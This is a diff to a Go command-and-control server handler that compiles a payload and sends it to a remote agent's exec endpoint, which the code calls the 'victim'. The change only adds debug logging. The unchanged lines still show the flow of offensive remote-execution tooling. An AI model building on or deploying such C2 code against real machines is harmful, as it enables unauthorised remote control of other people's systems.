@@ -79,6 +79,7 @@ func handleRequestAgentData(w http.ResponseWriter, r *http.Request) {
 }
 
 func handleExec(w http.ResponseWriter, r *http.Request) {
+	log.Printf("1a")
 	agentLock.RLock()
 	defer agentLock.RUnlock()
 	agentId := r.PathValue("id")
@@ -86,6 +87,7 @@ func handleExec(w http.ResponseWriter, r *http.Request) {
 	if !ok {
 		w.WriteHeader(http.StatusNotFound)
 		fmt.Fprintln(w, "C2 Agent not found!")
+		log.Printf("C2 Agent not found!")
 		return
 	}
 
@@ -95,6 +97,7 @@ func handleExec(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
 		fmt.Fprintln(w, "Failed to create temp dir!")
+		log.Printf("Failed to create temp dir!")
 		return
 	}
 	defer os.RemoveAll(dir)
@@ -104,6 +107,7 @@ func handleExec(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
 		fmt.Fprintln(w, "Failed to create payload temp file!")
+		log.Printf("Failed to create payload temp file!")
 		return
 	}
 	defer f.Close()
@@ -113,6 +117,7 @@ func handleExec(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
 		fmt.Fprintln(w, "Failed to compile payload!")
+		log.Printf("Failed to compile payload!")
 		return
 	}
 	agentExecUrl := fmt.Sprintf("%s/exec", agent.AgentUrl)
@@ -120,9 +125,11 @@ func handleExec(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
 		fmt.Fprintln(w, "Failed to send payload to victim!")
+		log.Printf("Failed to send payload to victim!")
 		return
 	}
 	fmt.Fprintln(w, "Payload sent to victim!")
+	log.Printf("sent!")
 }
 
 // Admin only
